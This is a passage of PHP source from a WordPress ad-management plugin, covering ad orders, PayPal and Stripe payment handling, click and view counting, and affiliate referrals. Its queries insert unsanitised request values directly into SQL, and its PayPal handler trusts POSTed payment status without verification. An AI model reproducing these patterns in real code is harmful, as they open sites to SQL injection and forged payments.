				if ( $_POST["ad_model"] == 'cpc' || $_POST["ad_model"] == 'cpm' || $_POST["ad_model"] == 'cpd' || $val) {

					// if isset img
					if ( $_FILES['img']["name"] ) {
						$allowedExts = array("gif", "jpeg", "jpg", "png");
						$temp = explode(".", $_FILES["img"]["name"]);
						$extension = end($temp);
						$fileName = NULL;

						if ((($_FILES["img"]["type"] == "image/gif")
								|| ($_FILES["img"]["type"] == "image/jpeg")
								|| ($_FILES["img"]["type"] == "image/jpg")
								|| ($_FILES["img"]["type"] == "image/pjpeg")
								|| ($_FILES["img"]["type"] == "image/x-png")
								|| ($_FILES["img"]["type"] == "image/png"))
							&& $_FILES["img"]["error"] == 0
							&& in_array($extension, $allowedExts)) {

							$fileName = time().'-'.$_FILES["img"]["name"];
							$path     = bsa_upload_url('basedir').$fileName;
							$thumbLoc = $_FILES["img"]["tmp_name"];

							list($width, $height) = getimagesize($thumbLoc);
							$maxSize = get_option($plugin_id.'thumb_size');
							$maxWidth = get_option($plugin_id.'thumb_w');
							$maxHeight = get_option($plugin_id.'thumb_h');

							if (($_FILES["img"]["size"] > $maxSize * 1024) OR $width > $maxWidth OR $height > $maxHeight) {

								return 'invalidSizeFile'; // return error if to big

							} else {
								// save img
								move_uploaded_file($thumbLoc, $path);
							}
						} else {

							return 'invalidFile'; // return error if type of img incorrect
						}
					} else {
						$fileName = '';
					}

					// set limit for cpd - change days to timestamp
					if ( $_POST["ad_model"] == 'cpd' ) {
						$ad_limit = time() + ($_POST["ad_limit_" . $_POST["ad_model"]] * 24 * 60 * 60);
					} else {
						$ad_limit = $_POST["ad_limit_" . $_POST["ad_model"]];
					}

					// valid contracts
					$contract = NULL;
					if ( bsa_space($_POST["space_id"], $_POST["ad_model"].'_contract_1') == $_POST["ad_limit_" . $_POST["ad_model"]] ) {
						$contract = '1';
					} elseif ( bsa_space($_POST["space_id"], $_POST["ad_model"].'_contract_2') == $_POST["ad_limit_" . $_POST["ad_model"]] ) {
						$contract = '2';
					} elseif ( bsa_space($_POST["space_id"], $_POST["ad_model"].'_contract_3') == $_POST["ad_limit_" . $_POST["ad_model"]] ) {
						$contract = '3';
					}
					$contract = apply_filters( "bsa-pro-setContract", $contract, $_POST);

					$validation = true;
					$validation = apply_filters( "bsa-pro-addAdValidation", $validation, $_POST);

					if ( $contract !== NULL && $validation) {
						$price = (bsa_space($_POST["space_id"], $_POST["ad_model"].'_price') * ($_POST["ad_limit_" . $_POST["ad_model"]] / bsa_space($_POST["space_id"], $_POST["ad_model"].'_contract_1')));
						if ( $contract > 1 ) {
							$discount = ((bsa_space($_POST["space_id"], 'discount_'.$contract) > 0) ? $price * (bsa_space($_POST["space_id"], 'discount_'.$contract) / 100) : 0);
						} else {
							$discount = 0;
						}
						$cost = $price - $discount;
						$cost = apply_filters( "bsa-pro-setCost", $cost, $_POST, $contract);

						$paid = 0;
						$paid = apply_filters( "bsa-pro-setPaid", $paid, $_POST, $contract);

						if ( isset( $cost ) ) {

							// insert new Ad
							$this->wpdb->insert(
								$this->getTableName('ads'),
								array(
									'id' 				=> NULL,
									'space_id' 			=> (isset($_POST["space_id"])) ? $_POST["space_id"] : NULL,
									'buyer_email' 		=> (isset($_POST["buyer_email"])) ? $_POST["buyer_email"] : NULL,
									'title' 			=> (isset($_POST["title"])) ? stripslashes($_POST["title"]) : NULL,
									'description' 		=> (isset($_POST["description"])) ? stripslashes($_POST["description"]) : NULL,
									'url' 				=> (isset($_POST["url"])) ? $_POST["url"] : NULL,
									'img' 				=> $fileName,
									'html' 				=> (isset($_POST["html"])) ? $_POST["html"] : NULL,
									'ad_model' 			=> (isset($_POST["ad_model"])) ? $_POST["ad_model"] : NULL,
									'ad_limit' 			=> $ad_limit,
									'cost' 				=> $cost,
									'paid' 				=> (bsa_space($_POST["space_id"], 'discount_'.$contract) == 100 ? 1 : 0), // 0 - not paid, 1 - paid, 2 - Added via Admin Panel
									'status' 			=> 'pending'
								),
								array()
							);

							$ad_id = $this->wpdb->insert_id;

							// insert new referral if cookie
							if ( isset($_COOKIE['bsaProAffiliate']) && bsa_space($_POST["space_id"], 'discount_'.$contract) < 100 ) {
								$cookie 			= ($_COOKIE['bsaProAffiliate'] > 0 && get_current_user_id() != $_COOKIE['bsaProAffiliate'] ? $_COOKIE['bsaProAffiliate'] : 0);
								$commission_rate 	= (get_option('bsa_pro_plugin_ap_commission') > 0 && get_option('bsa_pro_plugin_ap_commission') < 100 ? get_option('bsa_pro_plugin_ap_commission') : 10);
								$this->wpdb->insert(
									$this->getTableName('referrals'),
									array(
										'id' 				=> null,
										'ref_id' 			=> $cookie,
										'order_id' 			=> $ad_id,
										'withdrawal_id' 	=> null,
										'buyer' 			=> (isset($_POST["buyer_email"])) ? $_POST["buyer_email"] : '-',
										'action_time' 		=> time(),
										'order_amount' 		=> $cost,
										'commission_rate' 	=> $commission_rate,
										'commission' 		=> $cost - ($cost - (($cost * $commission_rate) / 100)),
										'order_status' 		=> 'not_paid',
										'status' 			=> 'not_paid',
									),
									array()
								);
							}

							// add cron task if the user select a delay time
							if(isset($_POST["calendar"]) and $_POST["calendar"] != '' and preg_match('/^(\d{4})-(\d{2})-(\d{2})$/', $_POST["calendar"], $matches))
							{
								if(checkdate($matches[2], $matches[3], $matches[1]))
								{
									$str_time = strtotime($_POST["calendar"]);
									$current_time = time();
									if ( $str_time > $current_time ) {
										$this->wpdb->insert(
											$this->getTableName('cron'),
											array(
												'id' => NULL,
												'item_id' => $ad_id,
												'item_type' => 'ad',
												'action_type' => 'active',
												'start_time' => $str_time,
												'when_repeat' => 0,
												'status' => 'pending'
											),
											array()
										);

										wp_schedule_single_event( $str_time, 'bsa_cron_jobs' );
									}
								}
							}

							$getAgencyForm = get_option('bsa_pro_plugin_agency_ordering_form_url');
							$getOrderForm = get_option('bsa_pro_plugin_ordering_form_url');
							if ( $agency == 'agency' && $sid != null ) {
								$_SESSION['bsa_payment_url'] = $getAgencyForm.((strpos($getAgencyForm,'?') !== false) ? '&' : '?' ).'site_id='.$sid.'&oid='.$ad_id;
							} else {
								$_SESSION['bsa_payment_url'] = $getOrderForm.((strpos($getOrderForm,'?') !== false) ? '&' : '?' ).'oid='.$ad_id;
							}
							return 'successAdded'; // return success

						} else {

							return 'invalidParams'; // return error if some params invalid ( cost or ad_limit )
						}
					} else {

						return 'invalidParams'; // return error if some params invalid ( cost or ad_limit )
					}


				} else {

					return 'invalidParams'; // return error if some params invalid ( cost or ad_limit )
				}

			} else {

				return 'fieldsRequired'; // return error if some input empty
			}
		}
		return '';
	}

//	// get unavailable dates
//	public function getUnavailableDates($sid = null)
//	{
//		$keys = null;
//		$unavailable_dates = null;
//		$dates = null;
//		$table_name = $this->getTableName('spaces');
//		if ( $sid != null ) {
//			$sql = "SELECT id FROM {$table_name} WHERE site_id = {$sid} AND template != 'html' AND status = 'active'";
//		} else {
//			$sql = "SELECT id FROM {$table_name} WHERE site_id IS NULL AND template != 'html' AND status = 'active'";
//		}
//		$getSpaces = $this->wpdb->get_results($sql, ARRAY_A);
//
//		foreach ( $getSpaces as $space ) {
//			$keys[] 				.= $space['id'];
//			$getDates 				= bsa_space($space['id'], 'unavailable_dates');
//			$unavailable_dates[] 	= explode(',', $getDates);
//		}
//		if ( is_array($keys) && $keys != null && is_array($unavailable_dates) && $unavailable_dates != null ) {
//			$dates = array_combine($keys, $unavailable_dates);
//			return json_encode($dates);
//		} else {
//			return null;
//		}
//	}

	// get unavailable dates
	public function getUnavailableDates($sid = null)
	{
		$time = time();
		$keys = null;
		$unavailable_dates = null;
		$dates = null;
		$table_name = $this->getTableName('spaces');
		if ( $sid != null ) {
			$sql = "SELECT id FROM {$table_name} WHERE site_id = {$sid} AND template != 'html' AND status = 'active'";
		} else {
			$sql = "SELECT id FROM {$table_name} WHERE site_id IS NULL AND template != 'html' AND status = 'active'";
		}
		$getSpaces = $this->wpdb->get_results($sql, ARRAY_A);

		foreach ( $getSpaces as $space ) {
			$activeDates[$space['id']] = null;
			$pendingDates[$space['id']] = null;
			$keys[] 				.= $space['id'];
			$getDates 				= bsa_space($space['id'], 'unavailable_dates');

			if ( bsa_space($space['id'], 'max_items') == '1' ) {

			}
			$table_name = $this->getTableName('ads');
			$sql = "SELECT id, ad_limit, status FROM {$table_name} WHERE space_id = {$space['id']} AND ad_model = 'cpd' AND ad_limit >= {$time} AND status != 'removed'";
			$getAds = $this->wpdb->get_results($sql, ARRAY_A);

			foreach ( $getAds as $ad ) {
				if ( $ad['status'] == 'active' ) {
					if ( $ad['ad_limit'] - time() > 86400) {
						$days = number_format(($ad['ad_limit'] - time()) / 86400, 0, '', '');
						for ( $i = 0; $i < $days; $i++ ) {
							if ( isset($space['id']) ) {
								$activeDates[$space['id']] .= ','.(date("Y-m-d", time() + ($i * 24 * 60 * 60)));
							}
						}
					}
				} else {
					$table_name = $this->getTableName('cron');
					$sql = "SELECT start_time FROM {$table_name} WHERE item_id = {$ad['id']} AND item_type = 'ad' AND action_type >= 'active' AND status = 'pending' LIMIT 1";
					$getCron = $this->wpdb->get_row($sql, ARRAY_A);
					if ( $getCron['start_time'] - time() > 86400) {
						$start = number_format(($getCron['start_time'] - time()) / 86400, 0, '', '');
						$days = number_format(($ad['ad_limit'] - time()) / 86400, 0, '', '');
						if ( $start > 0 && $days > 0 && $days - $start > 0 ) {
							for ( $i = 0; $i < $days; $i++ ) {
//								var_dump($start);
								if ( $i > $start ) {
									$pendingDates[$space['id']] .= ','.(date("Y-m-d", time() + ($i * 24 * 60 * 60)));
								}
							}
						}
					}
				}
			}

			$unavailable_dates[] 	= explode(',', $getDates.(isset($activeDates[$space['id']]) ? $activeDates[$space['id']] : null).(isset($pendingDates[$space['id']]) ? $pendingDates[$space['id']] : null));
		}
		if ( is_array($keys) && $keys != null && is_array($unavailable_dates) && $unavailable_dates != null ) {
			$dates = array_combine($keys, $unavailable_dates);
			return json_encode($dates);
		} else {
			return null;
		}
	}

	// validation payment
	public function notifyAction($type = NULL)
	{
		if (empty($_POST))
			return;

		$paymentId = (isset($_GET['oid']) ? $_GET['oid'] : null);
		if ( isset($_POST) && !isset($_POST['stripeToken']) ) { // PayPal Verify
			$payment_crc = $_POST['custom'];
			try {
				$timestamp = time();
				$data = json_encode($_POST);

				$this->wpdb->update(
					$this->getTableName('ads'),
					array(
						'p_time' => $timestamp,
						'p_data' => $data
					),
					array('id' => $paymentId)
				);

				if ($payment_crc != md5($_POST['item_number'] . bsa_number_format($_POST['mc_gross'])))
					throw new \Exception('price changed');

				if ($_POST['payment_status'] == 'Pending')
					throw new \Exception('payment is pending');

				if ($_POST['payment_status'] == 'Denied')
					throw new \Exception('payment is denied');
			} catch (\Exception $e) {
				$error = $e->getMessage();
			}

			if (isset($error)) {
				$this->wpdb->update(
					$this->getTableName('ads'),
					array(
						'paid' => 0,
						'p_error' => $error
					),
					array('id' => $paymentId)
				);
			}

			if (isset($_POST) && isset($_POST['payment_status']) && $_POST['payment_status'] == 'Completed' && !isset($error)) { // change status
				$this->wpdb->update(
					$this->getTableName('ads'),
					array(
						'paid' => 1,
						'status' => ( get_option('bsa_pro_plugin_auto_accept') == 'no' OR $type == 'agency' ) ? 'pending' : 'active'
					),
					array('id' => $paymentId)
				);

				// change affiliate status
				if ( $this->validReferral($paymentId) ) {
					$this->wpdb->update(
						$this->getTableName('referrals'),
						array(
							'order_status' => 'paid'
						),
						array('order_id' => $paymentId)
					);
				}
			}

			// reset cache sessions
			unset($_SESSION['bsa_ad_'.$paymentId]);
		}

		if ( isset($_POST) && isset($_POST['stripeToken']) ) { // Stripe Verify

			if ( isset($_POST['stripeToken']) && isset($_GET['oid']) ) {

				require_once('Stripe/init.php');

				// Set your API key
				\Stripe\Stripe::setApiKey(get_option('bsa_pro_plugin_secret_key'));

				try {
					\Stripe\Charge::create(array(
						'amount' 		=> number_format(bsa_ad($_GET['oid'], 'cost'), 2, '', ''), // this is in cents: $20
						'currency' 		=> 'usd',
						'card' 			=> $_POST['stripeToken'],
						'description' 	=> bsa_ad($_GET['oid'], 'buyer_email') . ' (' . number_format(bsa_ad($_GET['oid'], 'cost'), 2, '', '') . ')'
					));

					$timestamp = time();
					$this->wpdb->update(
						$this->getTableName('ads'),
						array(
							'paid' => 1,
							'p_time' => $timestamp,
							'p_data' => $_POST['stripeToken'],
							'status' => ( get_option('bsa_pro_plugin_auto_accept') == 'no' OR $type == 'agency' ) ? 'pending' : 'active'
						),
						array('id' => $paymentId)
					);

					// change affiliate status
					if ( $this->validReferral($paymentId) ) {
						$this->wpdb->update(
							$this->getTableName('referrals'),
							array(
								'order_status' => 'paid'
							),
							array('order_id' => $paymentId)
						);
					}
					echo 'TRUE';
				} catch(\Stripe\Error\Card $e) {
					// The card has been declined

//					$error = $e->getMessage();
//					$this->wpdb->update(
//						$this->getTableName('ads'),
//						array(
//							'paid' => 0,
//							'p_error' => $error
//						),
//						array('id' => $paymentId)
//					);
//					echo 'FALSE';
				};
			}

			// change status to pending if pending cron task
			if ( $this->getPendingTask($paymentId, 'ad') ) {
				$this->wpdb->update(
					$this->getTableName('ads'),
					array(
						'status' => 'pending'
					),
					array('id' => $paymentId)
				);
			}

			// reset cache sessions
			unset($_SESSION['bsa_ad_'.$paymentId]);
		}

		if (isset($error)) {
			echo FALSE;
		} else {
			// email sender
			$sender = get_option('bsa_pro_plugin_trans_email_sender');
			$email = get_option('bsa_pro_plugin_trans_email_address');

			// buyer sender
			$paymentEmail = bsa_ad($paymentId, 'buyer_email');
			$subject = get_option('bsa_pro_plugin_trans_buyer_subject');
			$message = get_option('bsa_pro_plugin_trans_buyer_message');
			$search = '[STATS_URL]';
			if ( $type == 'agency' ) {
				$replace = get_option('bsa_pro_plugin_agency_ordering_form_url') . (( strpos(get_option('bsa_pro_plugin_agency_ordering_form_url'), '?') == TRUE ) ? '&' : '?') . "bsa_pro_stats=1&bsa_pro_email=" . str_replace('@', '%40', $paymentEmail) . "&bsa_pro_id=" . $paymentId . "#bsaStats\r\n";
			} else {
				$replace = get_option('bsa_pro_plugin_ordering_form_url') . (( strpos(get_option('bsa_pro_plugin_ordering_form_url'), '?') == TRUE ) ? '&' : '?') . "bsa_pro_stats=1&bsa_pro_email=" . str_replace('@', '%40', $paymentEmail) . "&bsa_pro_id=" . $paymentId . "#bsaStats\r\n";
			}
			$message = str_replace($search, $replace, $message);
			$headers = 'From: ' . $sender . ' <' . $email . '>' . "\r\n";
			wp_mail($paymentEmail, $subject, $message, $headers);

			if ( $type == 'agency' ) {
				// seller sender
				$sellerSubject = get_option('bsa_pro_plugin_trans_seller_subject');
				$sellerMessage = get_option('bsa_pro_plugin_trans_seller_message');
				$sellerHeaders = 'From: ' . $sender . ' <' . $email . '>' . "\r\n";
				$getUserId = bsa_site(bsa_space(bsa_ad($paymentId, 'space_id'), 'site_id'), 'user_id');
				$userInfo = get_userdata($getUserId);
				$userEmail = $userInfo->user_email;
				wp_mail($userEmail, $sellerSubject, $sellerMessage, $sellerHeaders);
			}

			if ( !isset($_POST['stripeToken']) ) {
				echo TRUE;
			}
		}
	}

	public function bsaGetBrowser() {
		$browser="";
		if(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]),strtolower("MSIE"))){$browser="IE";}
		elseif(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]),strtolower("Internet Explorer"))){$browser="IE";}
		else if(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]),strtolower("Presto"))){$browser="Opera";}
		else if(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]),strtolower("CHROME"))){$browser="Chrome";}
		else if(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]),strtolower("SAFARI"))){$browser="Safari";}
		else if(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]),strtolower("FIREFOX"))){$browser="FireFox";}
		else {$browser="other";}
		return $browser;
	}

	protected function counterValidator($id, $ip)
	{
		$table_name = $this->getTableName('stats');
		$sql = "SELECT count(1) FROM {$table_name} WHERE `ad_id` = {$id} AND `action_type` = 'click' AND `user_ip` = '{$ip}' AND `status` = 'correct' LIMIT 100";
		$result = $this->wpdb->get_col($sql);

		if ( $result ) {
			return $result[0];
		} else {
			return 0;
		}
	}

	// counting function
	public function bsaProCounter($ad_id = NULL)
	{
		$user_ip = $_SERVER['REMOTE_ADDR'];
		$browser = $this->bsaGetBrowser();

		if ( isset( $_GET['bsa_pro_url'] ) && isset( $_GET['bsa_pro_id'] ) ) {
			$aid = $_GET['bsa_pro_id'];
			$sid = bsa_ad($aid, 'space_id');
			$url = bsa_ad($aid, 'url');
			if ( $_GET['bsa_pro_url'] != '' &&  $_GET['bsa_pro_url'] != 1 ) {
				$url = ( $url != '' && $url != null ? $url : $_GET['bsa_pro_url'] );
			}

			$counterValidator = $this->counterValidator($aid, $user_ip);

			if ( $counterValidator == 0 ) { // If not clicked
				update_option('bsa_pro_plugin_dashboard_clicks', get_option('bsa_pro_plugin_dashboard_clicks') + 1); // increase clicks stats
			}

			$table_name = $this->getTableName('stats');
			$sql = "SELECT custom FROM {$table_name} WHERE ad_id = {$aid} AND action_type = 'click' AND status = 'correct' ORDER BY id DESC LIMIT 1";
			$get_result = $this->wpdb->get_col($sql);
			$get_counter = ((isset($get_result[0]) && $get_result[0] != null && $get_result[0] != '') ? $get_result[0] + 1 : null);

			// add new action
			$this->wpdb->insert(
				$this->getTableName('stats'),
				array(
					'id' => NULL,
					'space_id' => $sid,
					'ad_id' => $aid,
					'action_type' => 'click',
					'action_time' => time(),
					'user_ip' => $user_ip,
					'browser' => $browser,
					'status' => ( $counterValidator == 0 ) ? 'correct' : 'incorrect',
					'custom' => ( $counterValidator == 0 ) ? $get_counter : null
				)
			);

			// decrease click limit
			if ( bsa_ad($aid, 'ad_model') == 'cpc' && $counterValidator == 0 ) {
				$this->wpdb->query(
					"
					UPDATE {$this->getTableName('ads')}
					SET ad_limit = `ad_limit` - 1
					WHERE id = {$aid} LIMIT 1
					"
				);
			}

			$url = apply_filters( "bsa-pro-changeURL", $url, $aid);
			if ( $url != NULL ) {
				return $url;
			} else {
				return get_site_url();
			}

		} else {

			$aid = $ad_id;
			$sid = bsa_ad($aid, 'space_id');
			$curr_time = time();

			$table_name = $this->getTableName('stats');
			$sql = "SELECT id, action_time, custom FROM {$table_name} WHERE ad_id = {$aid} AND action_type = 'view' AND status = 'correct' ORDER BY id DESC LIMIT 1";
			$get_result = $this->wpdb->get_row($sql, ARRAY_A);
			$get_counter = ((isset($get_result) && $get_result['id'] != null && $get_result['custom'] != null && $get_result['custom'] != '') ? $get_result['custom'] + 1 : null);

			if ( isset($get_counter) && $get_result['action_time'] >= strtotime(date('Y-m-d', $curr_time)) ) { // row exists && today counter

				$this->wpdb->query(
					"
					UPDATE {$this->getTableName('stats')}
					SET custom = {$get_counter}, action_time = {$curr_time}
					WHERE id = {$get_result['id']} LIMIT 1
					"
				);
			} else {

				$this->wpdb->insert(
					$this->getTableName('stats'),
					array(
						'id' => NULL,
						'space_id' => $sid,
						'ad_id' => $aid,
						'action_type' => 'view',
						'action_time' => $curr_time,
						'user_ip' => $user_ip,
						'browser' => $browser,
						'status' => 'correct',
						'custom' => 1
					)
				);
			}

			// decrease view limit
			if ( bsa_ad($aid, 'ad_model') == 'cpm' ) {

				$this->wpdb->query(
					"
					UPDATE {$this->getTableName('ads')}
					SET ad_limit = `ad_limit` - 1
					WHERE id = {$aid} LIMIT 1
					"
				);
			}

			return TRUE;
		}
	}

	// Get daily views
	public function getDailyViews($time)
	{
		$table_name = $this->getTableName('stats');
		$sql = "SELECT count(1) FROM {$table_name} WHERE `action_type` = 'view' AND `action_time` > {$time} AND `status` = 'correct'";

		if ( $this->wpdb->get_col($sql) > 0 ) {
			return $this->wpdb->get_col($sql);
		} else {
			return 0;
		}
	}

	// Marketing Agency Functions
	public function getSite($id)
	{
		$table_name = $this->getTableName('sites');

		$sql = "SELECT *
			FROM {$table_name}
			WHERE id = {$id}
			LIMIT 1";

		if ( $this->wpdb->get_row($sql, ARRAY_A) ) {
			return $this->wpdb->get_row($sql, ARRAY_A);
		} else {
			return NULL;
		}
	}

	public function getUserSites($columns = 'id', $adm_type = NULL)
	{
		$table_name = $this->getTableName('sites');
		$user_id = get_current_user_id();

		if ( $adm_type == 'user') { // USER - MARKETING AGENCY
			$sql = "SELECT {$columns}
			FROM {$table_name}
			WHERE user_id = {$user_id} AND status != 'blocked'";
		} else { // ADMIN - MARKETING AGENCY
			$sql = "SELECT {$columns}
			FROM {$table_name}
			WHERE status != 'blocked'";
		}

		if ( $this->wpdb->get_results($sql, ARRAY_A) ) {
			if ( $columns == 'id' ) {
				$sites = '';
				foreach ( $this->wpdb->get_results($sql, ARRAY_A) as $key => $site ) {
					$sites .= (($key > 0) ? ',' : '').$site['id'];
				}
				return $sites;
			} else {
				return $this->wpdb->get_results($sql, ARRAY_A);
			}
		} else {
			return 0;
		}
	}

	public function getUserSpaces($columns = 'id', $adm_type = NULL)
	{
		$table_name = $this->getTableName('spaces');
		
		if ( $adm_type == NULL) { // USER - MARKETING AGENCY
			if ( $this->getUserSites('id', 'user') != NULL ) {
				$sql = "SELECT {$columns}
				FROM {$table_name}
				WHERE `site_id` IN ({$this->getUserSites('id', bsa_role())}) AND `status` != 'blocked'";
			} else {
				$sql = "SELECT {$columns}
				FROM {$table_name}
				WHERE `status` != 'blocked'";
			}
		} elseif( $adm_type == 'admin_dashboard' ) { // GET ADMIN SPACES - DASHBOARD
			$sql = "SELECT {$columns}
			FROM {$table_name}
			WHERE site_id IS NULL AND status != 'blocked' OR site_id IS NULL AND status != 'blocked'";
		} elseif( $adm_type == 'admin' ) { // GET ADMIN SPACES - MARKETING AGENCY
			if ( $this->getUserSites('id', 'user') != NULL ) {
				$sql = "SELECT {$columns}
				FROM {$table_name}
				WHERE `site_id` IS NULL AND `status` != 'blocked' OR `site_id` IN ({$this->getUserSites('id', 'user')}) AND `status` != 'blocked'";
			} else {
				$sql = "SELECT {$columns}
				FROM {$table_name}
				WHERE `site_id` IS NULL AND `status` != 'blocked'";
			}
		}

		if ( $this->wpdb->get_results($sql, ARRAY_A) ) {
			$spaces = '';
			foreach ( $this->wpdb->get_results($sql, ARRAY_A) as $key => $space ) {
				$spaces .= (($key > 0) ? ',' : '').$space['id'];
			}
			return $spaces;
		} else {
			return 0;
		}
	}

	public function siteExists($url = NULL)
	{
		$table_name = $this->getTableName('sites');

		if ( isset($url) && $url != NULL ) {
			$sql = "SELECT url
			FROM {$table_name}
			WHERE url LIKE '%{$url}%' LIMIT 1";
		} else {
			return FALSE;
		}
		$result = $this->wpdb->get_col($sql);

		if ( $result ) {
			return $result[0];
		} else {
			return NULL;
		}
	}

	// Affiliate Program
	public function getReferrals()
	{
		$table_name = $this->getTableName('referrals');
		$user_id = get_current_user_id();

		$sql = "SELECT * FROM {$table_name} WHERE ref_id = {$user_id} AND order_status = 'paid' AND status = 'not_paid'";
		$results = $this->wpdb->get_results($sql, ARRAY_A);

		if ( $results ) {
			return $results;
		} else {
			return null;
		}
	}

	public function getAffiliateBalance()
	{
		$table_name = $this->getTableName('referrals');
		$user_id = get_current_user_id();

		$sql = "SELECT sum(commission) FROM {$table_name} WHERE ref_id = {$user_id} AND order_status = 'paid' AND status = 'not_paid'";
		$result = $this->wpdb->get_col($sql);

		if ( $result[0] ) {
			return $result[0];
		} else {
			return 0;
		}
	}

	public function validReferral($oid)
	{
		$table_name = $this->getTableName('referrals');

		$sql = "SELECT id FROM {$table_name} WHERE order_id = {$oid} AND status = 'not_paid'";
		$result = $this->wpdb->get_col($sql);

		if ( $result[0] ) {
			return true;
		} else {
			return false;
		}
	}

	public function getAffiliateWithdrawals($status = NULL, $adm_type = NULL)
	{
		$table_name = $this->getTableName('salaries');
		$user_id = get_current_user_id();

		if ( $adm_type == 'user') { // USER - MARKETING AGENCY
			if ( $status == 'pending' ) {
				$sql = "SELECT * FROM {$table_name}
						WHERE status = 'pending' AND user_id = {$user_id}
						ORDER BY id DESC, status";
			} else {
				$sql = "SELECT * FROM {$table_name}
						WHERE user_id = {$user_id}
						ORDER BY id DESC, status";
			}
		} else { // ADMIN - MARKETING AGENCY
			if ( $status == 'pending' ) {
				$sql = "SELECT * FROM {$table_name}
						WHERE status = 'pending'
						ORDER BY id DESC, status";
			} else {
				$sql = "SELECT * FROM {$table_name}
						ORDER BY id DESC, status";
			}
		}
		$results = $this->wpdb->get_results($sql, ARRAY_A);

		return $results;
	}

	public function getAffiliateEarningsIds()
	{
		$table_name = $this->getTableName('referrals');
		$user_id = get_current_user_id();

		$sql = "SELECT id FROM {$table_name} WHERE ref_id = {$user_id} AND order_status = 'paid' AND status = 'not_paid'";
		$results = $this->wpdb->get_col($sql);

		if ( $results ) {
			return $results;
		} else {
			return null;
		}
	}
}